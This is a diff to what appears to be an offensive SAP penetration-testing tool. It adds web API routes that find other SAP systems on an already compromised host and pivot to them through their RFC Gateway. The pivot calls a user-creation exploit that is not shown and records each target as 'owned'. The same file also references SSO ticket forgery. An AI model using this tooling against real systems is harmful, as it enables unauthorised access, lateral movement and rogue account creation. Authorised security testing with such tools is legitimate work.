@@ -10166,6 +10166,97 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:create_user", "Create User", _run)
         return json.dumps({"status": "started"})
 
+    # ── Same-host co-location (issue #70) ───────────────────────────
+    @app.route("/api/node/<sid>/discover_colocated", method="POST")
+    def node_discover_colocated(sid):
+        """List /usr/sap on an owned node and correlate the other SAP SIDs with
+        the map (plots dashed placeholders for unscanned ones)."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            try:
+                from sap_colocation import discover_colocated_sids
+                res = discover_colocated_sids(node, api.state)
+                if res.get("ok"):
+                    found = [c["sid"] for c in res.get("colocated", [])]
+                    if found:
+                        added = res.get("placeholders_added") or []
+                        print(f"[+] {sid}: co-located SAP instances on host: "
+                              f"{', '.join(found)} "
+                              f"(new on map: {', '.join(added) or 'none'})")
+                    else:
+                        print(f"[*] {sid}: no other SAP instances found under "
+                              f"/usr/sap")
+                else:
+                    print(f"[-] {sid}: co-located discovery could not run "
+                          f"({res.get('reason')})")
+            except Exception as e:
+                print(f"[-] {sid}: co-located discovery error: {e}")
+
+        _bg(f"{sid}:discover_colocated", "Discover Co-located Instances", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/pivot_colocated", method="POST")
+    def node_pivot_colocated(sid):
+        """Pivot to co-located SAP system(s) on the same host via their RFC
+        Gateway, reusing the existing gateway primitive.  Body: optional
+        {"target_sid": "<SID>"} for one; otherwise every plotted co-located
+        system on the same host."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        target_sid = (data.get("target_sid") or "").strip()
+
+        own_ips = set(node.all_ips() or [])
+        targets = []
+        for c in (node.colocated_sids or []):
+            if not c.get("plotted"):
+                continue
+            tsid = c.get("sid")
+            if target_sid and tsid != target_sid:
+                continue
+            tnode = api.state.get_node(tsid)
+            if tnode is None:
+                for n in api.state.nodes.values():
+                    if ((n.sid or "").split("@")[0] == tsid
+                            and (set(n.all_ips() or []) & own_ips)):
+                        tnode = n
+                        break
+            if tnode is not None and tnode.sid != node.sid and tnode not in targets:
+                targets.append(tnode)
+        if not targets:
+            return json.dumps({"error": "no co-located plotted system to pivot "
+                                        "to — run discovery, and scan the "
+                                        "co-located system first"})
+
+        def _run():
+            for tnode in targets:
+                try:
+                    print(f"[*] {sid}: pivoting to co-located {tnode.sid} on "
+                          f"{tnode.ip or tnode.hostname} via its RFC Gateway")
+                    created = sapmap_exploit.create_user_gw_exploit(
+                        tnode, api.state)
+                    if created:
+                        api.state.track_created_user(created)
+                        sapmap_exploit._post_exploit_enrichment(
+                            tnode, api.state, proven_type="ABAP")
+                        print(f"[+] {sid}: co-located {tnode.sid} owned via "
+                              f"Gateway pivot")
+                    else:
+                        print(f"[-] {sid}: Gateway pivot to {tnode.sid} did "
+                              f"not succeed")
+                except Exception as e:
+                    print(f"[-] {sid}: pivot to {tnode.sid} error: {e}")
+
+        _bg(f"{sid}:pivot_colocated", "Pivot to Co-located", _run)
+        return json.dumps({"status": "started",
+                           "targets": [t.sid for t in targets]})
+
     # ── MYSAPSSO2 ticket forgery (Phase D commits 7-9) ──────────────
     #
     # Two endpoints, both background-task driven:
